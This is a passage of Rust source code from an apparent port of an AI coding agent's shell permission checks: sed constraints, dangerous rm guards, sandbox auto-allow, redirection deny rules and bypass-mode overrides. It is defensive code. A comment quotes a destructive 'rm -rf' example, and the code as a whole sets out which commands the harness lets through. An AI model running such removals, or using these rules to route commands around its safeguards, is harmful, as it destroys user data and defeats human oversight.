    ///   auto-allow — a dangerous or out-of-workdir in-place sed prompts even in
    ///   `acceptEdits`);
    /// - `None` when some subcommand's base command is NOT on the allowlist (the
    ///   command falls through to the generic mode fallback / ask).
    ///
    /// `roots` supplies the working-dir set for the sed containment check
    /// (cwd + [`Self::additional_working_dirs`]).
    fn accept_edits_bash_auto_allow(
        &self,
        command: &str,
        roots: &FsRoots,
    ) -> Option<PermissionResult> {
        let subs = shell_command::split_command(command);
        if subs.is_empty() {
            return None;
        }
        // xDs whole-command sed gate (redirect-borne / over-length): runs ONCE
        // before the per-sed auto-allow pass, gated on there being >=1 sed
        // subcommand — mirroring `_gd` consulting `xDs` before `gpr`.
        if subs.iter().any(|sub| subcommand_is_sed(sub)) {
            if let Some(crate::sed_validation::SedVerdict::Unsafe { message, reason }) =
                crate::sed_validation::sed_redirect_borne_verdict(command)
            {
                return Some(ask_sed_constraint(message, reason));
            }
        }
        // FIRST pass mirrors the TS step ordering (sed-constraints BEFORE the
        // mode auto-allow): an UNSAFE sed subcommand asks immediately, even when
        // another subcommand would otherwise disqualify the whole command from
        // auto-allow. (TS `checkSedConstraints` runs over the whole command and
        // returns its ask before `checkPermissionMode` is consulted at all.)
        for sub in &subs {
            if base_command(sub) == Some("sed") {
                if let crate::sed_validation::SedVerdict::Unsafe { message, reason } =
                    crate::sed_validation::sed_auto_allow_verdict(
                        sub,
                        roots,
                        &self.additional_working_dirs.paths(),
                    )
                {
                    return Some(ask_sed_constraint(message, reason));
                }
            }
        }
        // SECOND: every subcommand's base command must be on the allowlist (sed
        // already verified Safe above). Any non-allowlisted base → fall through.
        let all_allowed = subs.iter().all(|sub| {
            base_command(sub).is_some_and(|base| ACCEPT_EDITS_ALLOWED_COMMANDS.contains(&base))
        });
        if all_allowed {
            Some(allow_with_mode(PermissionMode::AcceptEdits))
        } else {
            None
        }
    }

    /// General sed-constraints ASK (claude-code `checkSedConstraints`, TS step
    /// 5b — runs in EVERY mode). Walks the command's subcommands; for each `sed`
    /// subcommand whose mode-aware verdict
    /// ([`crate::sed_validation::sed_constraint_verdict`], `allow_file_writes`
    /// true iff `AcceptEdits`) is `Unsafe`, returns the byte-locked sed ask. A
    /// `Safe` verdict contributes nothing (returns `None`, falling through to the
    /// mode / read-only layers — 1:1 with the TS `passthrough`). Returns the
    /// FIRST unsafe sed in subcommand order, matching TS.
    fn sed_constraint_ask(
        &self,
        command: &str,
        roots: &FsRoots,
        mode: PermissionMode,
    ) -> Option<PermissionResult> {
        let subs = shell_command::split_command(command);
        // xDs whole-command sed gate (redirect-borne / over-length): runs ONCE
        // before the per-sed constraint loop, gated on there being >=1 sed
        // subcommand — mirroring `_gd` consulting `xDs` before `gpr`.
        if subs.iter().any(|sub| subcommand_is_sed(sub)) {
            if let Some(crate::sed_validation::SedVerdict::Unsafe { message, reason }) =
                crate::sed_validation::sed_redirect_borne_verdict(command)
            {
                return Some(ask_sed_constraint(message, reason));
            }
        }
        let allow_file_writes = mode == PermissionMode::AcceptEdits;
        for sub in subs {
            if base_command(&sub) != Some("sed") {
                continue;
            }
            if let crate::sed_validation::SedVerdict::Unsafe { message, reason } =
                crate::sed_validation::sed_constraint_verdict(
                    &sub,
                    allow_file_writes,
                    roots,
                    &self.additional_working_dirs.paths(),
                )
            {
                return Some(ask_sed_constraint(message, reason));
            }
        }
        None
    }

    /// Shell-only sandbox-auto-allow guard (the 1d layer). `true` iff this is a
    /// shell tool, a [`Self::sandbox_runtime`] config is attached, and the
    /// command would be sandbox-auto-allowed. Non-shell tools / absent config ⇒
    /// `false` (no-op).
    fn shell_sandbox_auto_allows(&self, tool_name: &str, input: &serde_json::Value) -> bool {
        let Some(sandbox) = self.sandbox_runtime.as_ref() else {
            return false;
        };
        if !shell_command::is_shell_tool(tool_name) {
            return false;
        }
        // (review #3) `auto_allows` mirrors claude-code's BashTool-specific
        // sandbox branch and uses bash split/strip semantics; claude never routes
        // PowerShell through it. Excluding PowerShell here keeps the PowerShell
        // path-containment / invalid-parse Ask (a fail-closed guard evaluated
        // later in `authorize`) authoritative, instead of a bash-shaped sandbox
        // auto-allow pre-empting it for an unparseable PowerShell command.
        if tool_name == "PowerShell" {
            return false;
        }
        shell_command::command_from_input(input).is_some_and(|cmd| sandbox.auto_allows(cmd))
    }

    /// The actual 1d sandbox-auto-allow DECISION (claude-code `rLg`'s BAu-vs-WOg
    /// fork), used only at the [`Self::authorize`] allow site. On a
    /// NORMALLY-parsed command this is identical to [`Self::shell_sandbox_auto_allows`]
    /// (the permissive `BAu`/`auto_allows` check). On the TOO-COMPLEX /
    /// parse-abort branch (feature `bash-ast`) it instead runs the STRICT `WOg`
    /// battery ([`crate::sandbox_auto_allow::SandboxAutoAllowConfig::wog_allows_when_too_complex`]) —
    /// CC forks BAu XOR WOg, never both — so a too-complex command that WOg
    /// rejects is NOT auto-allowed and falls through to the too-complex prompt
    /// (PERM-SBX-WOG-02, an under-ask fix).
    ///
    /// NOTE: the tool-wide-ask exemption site ([`Self::authorize`] 1c) keeps
    /// calling the complexity-independent [`Self::shell_sandbox_auto_allows`] —
    /// CC's exemption `y` is C6-only there, and the port's extra `!bau_refuses`
    /// is a safe over-inclusion; the WOg fork must not change that site.
    fn shell_sandbox_auto_allows_decision(
        &self,
        tool_name: &str,
        input: &serde_json::Value,
        #[cfg(feature = "bash-ast")] parsed: Option<
            &crate::bash_ast_security::ParseForSecurityResult,
        >,
    ) -> bool {
        let Some(sandbox) = self.sandbox_runtime.as_ref() else {
            return false;
        };
        if !shell_command::is_shell_tool(tool_name) {
            return false;
        }
        if tool_name == "PowerShell" {
            return false;
        }
        let Some(cmd) = shell_command::command_from_input(input) else {
            return false;
        };
        #[cfg(feature = "bash-ast")]
        {
            let parsed_owned;
            let verdict = match parsed {
                Some(p) => p,
                None => {
                    parsed_owned = crate::bash_ast_security::parse_for_security(cmd);
                    &parsed_owned
                }
            };
            if let crate::bash_ast_security::ParseForSecurityResult::TooComplex { reason } = verdict
            {
                return sandbox.wog_allows_when_too_complex(cmd, reason);
            }
        }
        sandbox.auto_allows(cmd)
    }

    /// Shell-only general sed-constraint ASK (the 3-sed layer). Returns the
    /// byte-locked sed ask for the first `Unsafe` sed subcommand, or `None` when
    /// not a shell tool / no roots / no command / every sed is `Safe`.
    fn shell_sed_constraint_ask(
        &self,
        tool_name: &str,
        input: &serde_json::Value,
        mode: PermissionMode,
    ) -> Option<PermissionResult> {
        if !shell_command::is_shell_tool(tool_name) {
            return None;
        }
        let roots = self.roots.as_ref()?;
        let command = shell_command::command_from_input(input)?;
        self.sed_constraint_ask(command, roots, mode)
    }

    /// Shell-only possibly-empty `$VAR` removal FORCED-ASK (the 1e layer) —
    /// claude-code 2.1.205 `GIu`, run inside the too-complex bash-checker branch
    /// `hHg`. Returns the byte-locked `SafetyCheck` ask (with
    /// `classifier_approvable: false`) when the command is (a) classified
    /// `TooComplex` by the AST parser AND (b) contains an `rm`/`rmdir` whose
    /// target is a possibly-empty variable path
    /// ([`crate::dangerous_removal::dangerous_rm_on_variable_path`]); else
    /// `None`. The `TooComplex` gate mirrors `hHg` (CC reaches `GIu` only after
    /// the AST failed to statically resolve the command), so a parseable command
    /// whose variable is resolvable (`A=/tmp; rm -rf $A/*`) is not force-asked.
    #[cfg(feature = "bash-ast")]
    fn shell_dangerous_rm_variable_ask(
        tool_name: &str,
        input: &serde_json::Value,
        parsed: Option<&crate::bash_ast_security::ParseForSecurityResult>,
    ) -> Option<PermissionResult> {
        if !shell_command::is_shell_tool(tool_name) {
            return None;
        }
        let command = shell_command::command_from_input(input)?;
        // Too-complex gate (`hHg` runs `GIu` only on the too-complex branch).
        let too_complex = match parsed {
            Some(p) => {
                matches!(
                    p,
                    crate::bash_ast_security::ParseForSecurityResult::TooComplex { .. }
                )
            }
            None => matches!(
                crate::bash_ast_security::parse_for_security(command),
                crate::bash_ast_security::ParseForSecurityResult::TooComplex { .. }
            ),
        };
        if !too_complex {
            return None;
        }
        // NOTE(telemetry): CC emits `tengu_bash_dangerous_rm_too_complex` here
        // (`hHg`). The permission crate emits no AST-branch tengu events yet —
        // same as the sibling `tengu_bash_ast_too_complex`, which is likewise
        // unemitted — so the emission is deferred to the engine layer.
        if let Some((cmd, target)) =
            crate::dangerous_removal::dangerous_rm_on_variable_path(command)
        {
            return Some(ask_dangerous_rm_variable_path(tool_name, cmd, &target));
        }
        // PARITY 2.1.263 `xmo`: `mtt` first, then `Amo` over the AST's
        // substitutions. Both live on this same too-complex branch, and `Amo`
        // runs ONLY once `mtt` has come back empty.
        let found = crate::dangerous_removal::dangerous_removal_in_substitutions(command)?;
        Some(ask_dangerous_removal_in_substitution(tool_name, &found))
    }

    /// Shell-only bash command-injection safety ASK (the 2c layer). Splits the
    /// command into subcommands ([`crate::shell_command::split_command`], the
    /// claude-code `splitCommand` analogue), strips each subcommand's output
    /// redirection (matching TS, where `splitCommand` yields redirect-stripped
    /// subcommands and `checkPathConstraints` validates the redirect target
    /// separately — our 2b guard), and runs the
    /// [`crate::bash_security::bash_command_is_safe`] battery on each. Returns the
    /// FIRST subcommand's ask (1:1 with the per-subcommand
    /// `checkCommandAndSuggestRules` short-circuit), or `None` for a non-shell
    /// tool / no command / every subcommand safe.
    /// Deny an output redirection whose resolved target matches an `Edit(<path>)`
    /// CONTENT deny rule (claude-code `EUr`→`Ptt`, the `create`-op deny walk that
    /// runs before the containment ask). Returns a rule-typed `Deny` carrying the
    /// byte-exact `Output redirection to '<path>' was blocked by a deny rule.`
    /// explanation, or `None` when no simple write target matches. Walks sources
    /// in priority order; only `Edit(pattern)` CONTENT deny rules participate (a
    /// tool-wide `Edit` deny, and the read-op command-path deny walk, are
    /// documented follow-ups). Roots are supplied by the caller (guard is
    /// roots-gated like the sibling path guards).
    /// PATH-01: deny a bash command whose extracted command-path target matches
    /// a Read-deny (read op) / Edit-deny (write/create op) CONTENT rule
    /// (claude-code `EUr`→`Ptt`, the `Ww(...,"deny")` walk that runs before
    /// containment). Mirrors [`Self::output_redirect_deny`] but over the
    /// positional command paths, using the byte-exact containment-template
    /// message CC reuses for a rule-typed deny. Returns the FIRST match, or
    /// `None`.
    fn command_path_deny(
        &self,
        sources: &[PermissionRuleSource],
        command: &str,
        roots: &FsRoots,
    ) -> Option<PermissionResult> {
        for target in crate::command_path_containment::command_path_deny_targets(
            command,
            roots,
            &self.additional_working_dirs.paths(),
        ) {
            let rule_tool = if target.is_write { "Edit" } else { "Read" };
            for src in sources {
                let Some(rules) = self.deny_rules.get(src) else {
                    continue;
                };
                if let Some(rule) = decide_in_source(rules, |rule| {
                    if rule.value.tool_name != rule_tool {
                        return RulePatternMatch::NoMatch;
                    }
                    let Some(pattern) = rule.value.rule_content.as_deref() else {
                        return RulePatternMatch::NoMatch;
                    };
                    test_rule_pattern(&target.resolved, pattern, rule.source, rule.behavior, roots)
                }) {
                    return Some(PermissionResult::Deny {
                        reason: PermissionDecisionReason::MatchedRule { rule: rule.clone() },
                        explanation: Some(target.blocked_message.clone()),
                        metadata: PermissionMetadata::default(),
                    });
                }
            }
        }
        None
    }

    fn output_redirect_deny(
        &self,
        sources: &[PermissionRuleSource],
        command: &str,
        roots: &FsRoots,
    ) -> Option<PermissionResult> {
        for target in crate::path_constraints::write_redirect_targets(command, roots) {
            for src in sources {
                let Some(rules) = self.deny_rules.get(src) else {
                    continue;
                };
                if let Some(rule) = decide_in_source(rules, |rule| {
                    if rule.value.tool_name != "Edit" {
                        return RulePatternMatch::NoMatch;
                    }
                    let Some(pattern) = rule.value.rule_content.as_deref() else {
                        return RulePatternMatch::NoMatch;
                    };
                    test_rule_pattern(&target, pattern, rule.source, rule.behavior, roots)
                }) {
                    return Some(PermissionResult::Deny {
                        reason: PermissionDecisionReason::MatchedRule { rule: rule.clone() },
                        explanation: Some(format!(
                            "Output redirection to '{target}' was blocked by a deny rule."
                        )),
                        metadata: PermissionMetadata::default(),
                    });
                }
            }
        }
        None
    }

    fn input_redirect_deny(
        &self,
        sources: &[PermissionRuleSource],
        command: &str,
        roots: &FsRoots,
    ) -> Option<PermissionResult> {
        for target in crate::path_constraints::read_redirect_targets(command, roots) {
            for src in sources {
                let Some(rules) = self.deny_rules.get(src) else {
                    continue;
                };
                if let Some(rule) = decide_in_source(rules, |rule| {
                    if rule.value.tool_name != "Read" {
                        return RulePatternMatch::NoMatch;
                    }
                    let Some(pattern) = rule.value.rule_content.as_deref() else {
                        return RulePatternMatch::NoMatch;
                    };
                    test_rule_pattern(&target, pattern, rule.source, rule.behavior, roots)
                }) {
                    return Some(PermissionResult::Deny {
                        reason: PermissionDecisionReason::MatchedRule { rule: rule.clone() },
                        explanation: Some(format!(
                            "Input redirection from '{target}' was blocked by a deny rule."
                        )),
                        metadata: PermissionMetadata::default(),
                    });
                }
            }
        }
        None
    }

    /// EDIT-READDENY-02: `CZn(path, ctx)` — is the Edit target covered by a
    /// Read deny rule? 1:1 with claude-code 2.1.211:
    /// ```text
    /// function CZn(e,t){
    ///   if(h8(t,Est,U2(t).filter((n)=>!$$y.has(n.source)))!==null)return!0;
    ///   if(rws(t,"read","deny").size===0)return!1;
    ///   return Yy(e).some((n)=>Ww(n,t,"read","deny")!==null)}
    /// ```
    /// (1) a TOOL-WIDE Read deny rule from a source NOT in
    /// `$$y = {toolsNarrowing, cliArg, command}` (`toolsNarrowing` is unported),
    /// OR (2) a read/deny CONTENT rule covering the resolved path
    /// ([`test_rule_pattern`] handles the raw+resolved `Yy` variants).
    /// Roots-gated (returns `false` without roots).
    fn edit_covered_by_read_deny(&self, tool_name: &str, input: &serde_json::Value) -> bool {
        let Some(roots) = self.roots.as_ref() else {
            return false;
        };
        // (1) tool-wide Read deny rule (excluding cliArg / command sources).
        for src in SOURCES_BY_PRIORITY {
            if matches!(
                src,
                PermissionRuleSource::CliArg | PermissionRuleSource::Command
            ) {
                continue;
            }
            if let Some(rules) = self.deny_rules.get(&src) {
                if rules
                    .iter()
                    .any(|r| r.value.rule_content.is_none() && r.value.tool_name == "Read")
                {
                    return true;
                }
            }
        }
        // (2) read/deny CONTENT rule covering the path.
        let Some(path) = input_path_for_tool(tool_name, input, roots) else {
            return false;
        };
        for src in SOURCES_BY_PRIORITY {
            let Some(rules) = self.deny_rules.get(&src) else {
                continue;
            };
            if decide_in_source(rules, |rule| {
                if rule.value.tool_name != "Read" {
                    return RulePatternMatch::NoMatch;
                }
                let Some(pattern) = rule.value.rule_content.as_deref() else {
                    return RulePatternMatch::NoMatch;
                };
                test_rule_pattern(&path, pattern, rule.source, rule.behavior, roots)
            })
            .is_some()
            {
                return true;
            }
        }
        false
    }

    /// BGOP-01: the `&` background-operator allow→ask downgrade — 1:1 with
    /// claude-code `Yqr`. Given the FINAL permission result, returns
    /// `Some(background_ask)` when the result is an ALLOW for a shell command
    /// that (a) contains `&`, (b) is not the sandbox-auto-allow grant (`hTt`
    /// reason, exempt), and (c) either fails to parse or whose AST contains a
    /// background `&` operator (or an ERROR node) per `XAu`. `None` keeps the
    /// original allow. Backgrounding defers execution past approval-time safety
    /// checks, so the forced ask is a SafetyCheck with `classifier_approvable:
    /// false`.
    #[cfg(feature = "bash-ast")]
    fn background_operator_ask(
        &self,
        tool_name: &str,
        input: &serde_json::Value,
        result: &PermissionResult,
    ) -> Option<PermissionResult> {
        if !shell_command::is_shell_tool(tool_name) {
            return None;
        }
        let PermissionResult::Allow { reason, .. } = result else {
            return None;
        };
        let command = shell_command::command_from_input(input)?;
        if !command.contains('&') {
            return None;
        }
        // Sandbox auto-allow (`hTt`) is exempt.
        if matches!(
            reason,
            PermissionDecisionReason::Other { reason }
                if reason == "Auto-allowed with sandbox (autoAllowBashIfSandboxed enabled)"
        ) {
            return None;
        }
        // Keep the allow only when the parse SUCCEEDS and shows NO background
        // operator (`o && o!==NCe && !XAu(o)`); an unparseable command
        // (`parse_raw` → `None`) is treated as "cannot confirm" → downgrade.
        if let Some(tree) = crate::bash_tree_sitter::parse_raw(command) {
            if !has_background_operator(tree.root_node()) {
                return None;
            }
        }
        Some(ask_background_operator(tool_name))
    }

    /// Whether bypassPermissions is in effect for this call — 1:1 with
    /// claude-code U1g's `p = d==="bypassPermissions" || (d==="plan" &&
    /// isBypassPermissionsModeAvailable)`, subject to the killswitch. Threaded
    /// into the guard block so guard ASKS (except dangerous rm/rmdir) are
    /// overridden to allow (BYPASS-01).
    fn bypass_active(&self, mode: PermissionMode) -> bool {
        if self.bypass_killswitch_active {
            return false;
        }
        mode == PermissionMode::BypassPermissions
            || (mode == PermissionMode::Plan
                && self.bypass_permissions_available
                // `zj`'s third conjunct, `!Ae()` — plan counts as bypass only
                // in an interactive session. See [`Self::interactive_session`].
                && self.interactive_session)
    }

    /// Resolve a per-tool GUARD ask against the bypass override (BYPASS-01) and
    /// the tool-wide allow walk (ALLOWOVER-01), 1:1 with the tail of claude-code
    /// `U1g`:
    /// ```text
    /// if(l.behavior==="ask" && (f || !p && (Are(...)||sandboxOverride||qRu))) return l;
    /// if(p) return {behavior:"allow", decisionReason:{type:"mode",mode:d}};
    /// let m=nes(...); if(m) return {behavior:"allow", ..., rule:m};
    /// return l;
    /// ```
    /// where `f` = the ask is a safetyCheck whose reason starts with "Dangerous
    /// rm/rmdir operation". A SafetyCheck ask (our dangerous-removal guards) is
    /// returned unchanged — it survives BOTH bypass and the tool-wide allow. A
    /// type-`other` guard ask (path/sed/injection/PowerShell containment) is
    /// (a) overridden to allow under bypass, else (b) overridden to allow by a
    /// matching TOOL-WIDE allow rule (`nes`, tool-wide only, no glob), else
    /// (c) returned as the ask. Non-`Ask` results (guard DENYs) pass through
    /// unchanged — deny short-circuits before bypass in CC.
    fn resolve_guard_ask(
        &self,
        ask: PermissionResult,
        bypass: bool,
        mode: PermissionMode,
        sources: &[PermissionRuleSource],
        tool_name: &str,
    ) -> PermissionResult {
        let PermissionResult::Ask { reason, .. } = &ask else {
            return ask;
        };
        if let PermissionDecisionReason::SafetyCheck { reason, .. } = reason {
            let dangerous_rm = reason.starts_with("Dangerous rm operation")
                || reason.starts_with("Dangerous rmdir operation");
            // A non-dangerous-rm safetyCheck ask is suppressed under bypass
            // (matches CC's `f` predicate); dangerous-rm asks always survive.
            if bypass && !dangerous_rm {
                return allow_with_mode(mode);
            }
            return ask;
        }
        // type-`other` guard ask.
        if bypass {
            return allow_with_mode(mode);
        }
        if let Some(rule) = self.tool_wide_allow_match(sources, tool_name, mode) {
            return allow_with_rule(rule);
        }
        ask
    }

    /// The TOOL-WIDE allow walk (`nes`): the first ALLOW rule with no content
    /// (`ruleContent === void 0`) whose tool name matches (exact / MCP
    /// server-level, NO glob — `nes` uses default opts) and that is available in
    /// the effective mode ([`Self::rule_is_available_in_mode`], the auto-mode
    /// dangerous-rule read filter). Consulted by [`Self::resolve_guard_ask`] so
    /// a blanket allow overrides a type-`other` guard ask.
    fn tool_wide_allow_match(
        &self,
        sources: &[PermissionRuleSource],
        tool_name: &str,
        mode: PermissionMode,
    ) -> Option<&PermissionRule> {
        for src in sources {
            if let Some(rules) = self.allow_rules.get(src) {
                if let Some(rule) = rules.iter().find(|r| {
                    r.value.rule_content.is_none()
                        && self.rule_is_available_in_mode(r, mode)
                        && tool_wide_name_matches(&r.value.tool_name, tool_name)
                }) {
                    return Some(rule);
                }
            }
        }
        None
    }

    fn shell_bash_safety_ask(
        &self,
        tool_name: &str,
        input: &serde_json::Value,
        #[cfg(feature = "bash-ast")] parsed: Option<
            &crate::bash_ast_security::ParseForSecurityResult,
        >,
    ) -> Option<PermissionResult> {
        if !shell_command::is_shell_tool(tool_name) {
            return None;
        }
        let command = shell_command::command_from_input(input)?;

        // ── AST-authoritative safety gate (claude-code 2.1.195). When the
        // tree-sitter grammar is available, the AST verdict is authoritative:
        //   • TooComplex      → ask (cannot be statically analyzed)
        //   • Simple + Deny   → ask (a dangerous construct was found)
        //   • Simple + Ok     → clean parse, no dangerous semantics → the legacy
        //                       regex battery is intentionally SKIPPED (matching
        //                       the binary's `astParseSucceeded` gate)
        //   • ParseUnavailable→ fall through to the legacy battery below
        // SAFETY: `parse_for_security` is conservative (it OVER-marks TooComplex,
        // verified zero under-ask), and `check_semantics` is reconciled to the
        // 2.1.195 binary superset, so `Simple+Ok ⊆ the binary's allow-set` — the
        // flip can only ask MORE than the binary, never less.
        #[cfg(feature = "bash-ast")]
        {
            use crate::bash_ast_security::{
                check_semantics, parse_for_security, ParseForSecurityResult, SemanticCheckResult,
            };
            let parsed_owned;
            let verdict = match parsed {
                Some(p) => p,
                None => {
                    parsed_owned = parse_for_security(command);
                    &parsed_owned
                }
            };
            match verdict {
                ParseForSecurityResult::TooComplex { reason } => {
                    // `zU(p.reason)` — the read block escalates an unparsable
                    // command ahead of the ordinary bash-safety ask.
                    if let Some(escalated) =
                        self.read_block_unanalyzable_ask(tool_name, command, reason)
                    {
                        return Some(escalated);
                    }
                    return Some(ask_bash_safety(tool_name, reason.clone()));
                }
                ParseForSecurityResult::Simple { commands } => {
                    if let SemanticCheckResult::Deny { reason } = check_semantics(commands) {
                        // `zU(E.reason)` — same escalation on the semantics path.
                        if let Some(escalated) =
                            self.read_block_unanalyzable_ask(tool_name, command, &reason)
                        {
                            return Some(escalated);
                        }
                        return Some(ask_bash_safety(tool_name, reason));
                    }
                    return None;
                }
                ParseForSecurityResult::ParseUnavailable => {
                    // Grammar could not parse this command — fall through to the
                    // legacy regex battery (which never early-allows).
                }
            }
        }

        for sub in shell_command::split_command(command) {
            let stripped = shell_command::strip_output_redirections(&sub);
            if let crate::bash_security::BashSafetyVerdict::Ask { message } =
                crate::bash_security::bash_command_is_safe(&stripped)
            {
                return Some(ask_bash_safety(tool_name, message));
            }
        }
        None
    }

    fn shell_overlength_bash_ask(
        tool_name: &str,
        input: &serde_json::Value,
    ) -> Option<PermissionResult> {
        if !matches!(tool_name, "Bash" | "Shell") {
            return None;
        }
        let command = shell_command::command_from_input(input)?;
        if command.chars().count() <= 10_000 {
            return None;
        }
        Some(ask_bash_safety(
            tool_name,
            "Command exceeds maximum length of 10000 characters and cannot be statically analyzed"
                .to_string(),
        ))
    }

    /// Shell-only read-only inference (the 3c layer). `true` iff this is a shell
    /// tool whose command is wholly read-only
    /// ([`crate::read_only_command::command_is_read_only`]).
    fn shell_is_read_only(tool_name: &str, input: &serde_json::Value) -> bool {
        if !shell_command::is_shell_tool(tool_name) {
            return false;
        }
        shell_command::command_from_input(input)
            .is_some_and(crate::read_only_command::command_is_read_only)
    }

    /// Compound-command allow composition (the 3d layer) — claude-code
    /// `bashToolHasPermission`'s per-subcommand
    /// `subcommandPermissionDecisions.every(_ => _.behavior === 'allow')`
    /// (`bashPermissions.ts:2239-2385`). For a shell command that splits into
    /// MORE THAN ONE subcommand, returns `Some(Allow)` iff EVERY subcommand is
    /// independently allowable via one of TS `bashToolCheckPermission`'s
    /// allow-producing steps:
    /// - a CONTENT allow RULE covering the subcommand
    ///   ([`shell_command::command_fully_allowed`] per subcommand — roots-gated,
    ///   mirroring [`Self::shell_allow`]'s gating and matching TS steps 4/5), OR
    /// - the read-only inference ([`crate::read_only_command::command_is_read_only`]
    ///   — roots-independent, TS step 7), OR
    /// - the `AcceptEdits` mode auto-allow (base command in
    ///   [`ACCEPT_EDITS_ALLOWED_COMMANDS`], TS step 6).
    ///
    /// This composes the homogeneous [`Self::shell_allow`] (all-rule) and
    /// [`Self::shell_is_read_only`] (all-read-only) layers PER-SUBCOMMAND, so a
    /// MIXED compound (`gh pr view … || true` = rule-allowed `gh pr view` + a
    /// read-only `true`) is allowed exactly as TS's `.every(allow)` does. Runs
    /// only for a genuine compound (`subs.len() >= 2`): a single subcommand that
    /// is rule-allowed / read-only / mode-allowed was already handled by the
    /// homogeneous layers above, so this never changes single-command outcomes.
    ///
    /// SAFE DIRECTION: the deny/ask rule walks and the dangerous-removal /
    /// path-constraint / bash-safety / sed guards all ran on the whole command
    /// before this layer (1:1 with TS, whose per-subcommand deny/ask already
    /// short-circuited through those same walks). A subcommand counted as
    /// read-only cannot be a writer; a rule-allowed subcommand matched an
    /// explicit allow rule; an `AcceptEdits`-mode subcommand's base is on the
    /// narrow allowlist (and a dangerous `rm` / unsafe `sed` already asked
    /// above). So this can only allow a compound whose every part is genuinely
    /// safe — it never over-allows.
    fn shell_compound_allow(
        &self,
        tool_name: &str,
        input: &serde_json::Value,
        sources: &[PermissionRuleSource],
        mode: PermissionMode,
    ) -> Option<PermissionResult> {
        if !shell_command::is_shell_tool(tool_name) {
            return None;
        }
        let command = shell_command::command_from_input(input)?;
        let subs = shell_command::split_command(command);
        // Only a genuine compound needs composing; single commands were handled
        // by the homogeneous allow / read-only layers above.
        if subs.len() < 2 {
            return None;
        }
        // Gather this call's CONTENT allow rules across all sources (mirrors
        // `shell_allow`'s content aggregation). Roots-gated: shell content
        // matching is meaningless without roots (as in `shell_allow`), so
        // without roots the rule-allow arm contributes nothing and each
        // subcommand must be read-only (or `AcceptEdits`-mode-allowed) — exactly
        // the behavior of the roots-gated `shell_allow` being skipped.
        let contents: Vec<&str> = if self.roots.is_some() {
            let mut v: Vec<&str> = Vec::new();
            for src in sources {
                if let Some(rules) = self.allow_rules.get(src) {
                    for r in rules {
                        if self.rule_is_available_in_mode(r, mode)
                            && r.value.tool_name == tool_name
                            && r.value.rule_content.is_some()
                        {
                            if let Some(c) = r.value.rule_content.as_deref() {
                                v.push(c);
                            }
                        }
                    }
                }
            }
            v
        } else {
            Vec::new()
        };
        let accept_edits = mode == PermissionMode::AcceptEdits;
        let all_allowed = subs.iter().all(|sub| {
            // Allow RULE covering this single subcommand (TS steps 4/5).
            (!contents.is_empty() && shell_command::command_fully_allowed(&contents, sub))
                // Read-only inference (TS step 7, roots-independent).
                || crate::read_only_command::command_is_read_only(sub)
                // `AcceptEdits` mode auto-allow: base command on the narrow
                // allowlist (TS step 6). A dangerous `rm` / unsafe `sed` already
                // asked above, so a surviving allowlisted base is safe to allow.
                || (accept_edits
                    && base_command(sub)
                        .is_some_and(|base| ACCEPT_EDITS_ALLOWED_COMMANDS.contains(&base)))
        });
        if all_allowed {
            Some(allow_compound())
        } else {
            None
        }
    }
}

/// Base (first) command word of a subcommand — TS `trimmedCmd.split(/\s+/)[0]`.
/// Returns `None` for an empty subcommand.
fn base_command(sub: &str) -> Option<&str> {
    sub.split_whitespace().next()
}

/// Whether `sub` is a `sed` subcommand for the redirect-borne / `xDs` gate. The
/// oracle `_gd` gates `xDs` on `ygd(o)!==null`, which unquotes and strips safe
/// wrappers before checking the command name. Under `bash-ast` this uses that
/// unquoting/wrapper-aware `kds` so a quoted (`"sed"`) or wrapped (`command sed`,
/// `\sed`) invocation still enters the gate; the bare `base_command == "sed"` is
/// kept as a floor and is the only check on the minimal build (where the
/// redirect-borne branch is a documented no-op anyway).
fn subcommand_is_sed(sub: &str) -> bool {
    #[cfg(feature = "bash-ast")]
    {
        if crate::sed_redirect_borne::is_sed_command(sub) {
            return true;
        }
    }
    base_command(sub) == Some("sed")
}

/// Parsed MCP tool/rule name — 1:1 with claude-code
/// `mcpInfoFromString` (`services/mcp/mcpStringUtils.ts:19-31`).
struct McpInfo<'a> {
    server_name: &'a str,
    /// `None` for a server-level name (`mcp__server`); `Some("tool")` for a
    /// fully-qualified name; `Some("*")` for the explicit wildcard.
    tool_name: Option<&'a str>,
}

/// Split `mcp__<server>[__<tool…>]` into its parts, or `None` for a non-MCP
/// string. Mirrors TS `mcpInfoFromString`: requires the `mcp` prefix and a
/// non-empty server; everything after the server (joined back with `__`) is the
/// tool name, or `None` when absent.
fn mcp_info_from_string(s: &str) -> Option<McpInfo<'_>> {
    let mut parts = s.splitn(3, "__");
    let mcp_part = parts.next()?;
    if mcp_part != "mcp" {
        return None;
    }
    let server_name = parts.next().filter(|p| !p.is_empty())?;
    // `splitn(3, ..)` keeps everything after the second `__` (incl. further
    // `__`) intact as the tool name — matching TS `toolNameParts.join('__')`.
    let tool_name = parts.next();
    Some(McpInfo {
        server_name,
        tool_name,
    })
}

/// Does a TOOL-WIDE rule name match a tool — 1:1 with the tool-name branch of
/// claude-code `toolMatchesRule` (`permissions.ts:251-268`). Exact name match,
/// OR an MCP server-level rule: `mcp__server` (or `mcp__server__*`) matches any
/// `mcp__server__tool` of that server.
///
/// `pub` so the orchestrator's wire-tool deny filter
/// ([`PermissionPolicy::tool_wide_deny_names`] → consumer in `build_wire_tools`)
/// strips denied tools BEFORE the model sees them using the SAME matcher the
/// runtime check uses (claude-code `filterToolsByDenyRules`, `tools.ts:262-269`).
#[must_use]
pub fn tool_wide_name_matches(rule_tool_name: &str, tool_name: &str) -> bool {
    // The public matcher keeps the ALLOW-walk semantics (claude-code `nes`
    // uses default opts, `globMatching:false`): exact name or MCP server-level
    // prefix, no glob. The DENY/ASK walks use the glob-aware variant below.
    tool_wide_name_matches_opts(rule_tool_name, tool_name, false)
}

/// Glob-aware tool-wide name matcher — 1:1 with claude-code `URu` (`permissions.ts`).
///
/// `glob == true` (the DENY walk `h8` and ASK walk `kqe`, both passing
/// `globMatching:!0`) enables:
///   - a rule `toolName` containing `*` glob-matches the tool name via `_pi`
///     (`*`→`.*`, anchored, dotall) — e.g. `Web*` matches `WebFetch`/`WebSearch`;
///   - the MCP tool-part is glob-matched (`mcp__server__foo*` matches
///     `mcp__server__footool`).
///
/// `glob == false` (the ALLOW walk `nes`, default opts) keeps exact-name /
/// MCP server-level matching only. Alias/`proxyExpansion` (`sDn`/`toolAliases`)
/// is NOT ported — no runtime tool-alias map is wired in the port, and the
/// legacy static aliases are already normalized at parse time
/// ([`crate::rule::normalize_legacy_tool_name`]); documented as a follow-up.
#[must_use]
fn tool_wide_name_matches_opts(rule_tool_name: &str, tool_name: &str, glob: bool) -> bool {
